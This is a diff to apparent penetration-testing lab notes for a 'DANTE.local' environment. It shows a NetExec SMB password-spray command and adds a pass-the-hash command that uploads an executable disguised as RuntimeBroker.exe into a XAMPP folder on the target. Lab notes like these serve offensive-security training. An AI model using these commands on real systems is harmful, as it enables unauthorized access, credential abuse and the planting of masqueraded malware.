@@ -65,3 +65,9 @@
 ```
 ./nxc smb 172.16.1.13 -d DANTE.local -u 'gerald' -p /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 
 ```
+
+### Put file
+
+```
+./nxc smb 172.16.1.13 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:d0629f5539666892bf9ba9b34daa125c --put-file /opt/wmiexec2/RuntimeBroker.exe \\xampp\\apache\\bin\\iconv\\RuntimeBroker.exe
+```
